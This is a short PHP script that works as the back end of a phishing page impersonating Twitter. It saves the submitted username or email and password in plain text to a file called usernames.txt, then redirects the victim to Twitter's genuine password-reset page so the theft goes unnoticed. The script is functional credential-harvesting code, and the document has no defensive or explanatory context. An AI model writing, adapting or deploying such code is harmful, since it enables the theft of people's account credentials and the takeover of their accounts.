<?php

file_put_contents("usernames.txt", "Account: " . $_POST['usernameOrEmail'] . "\nPass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/account/begin_password_reset');
exit();
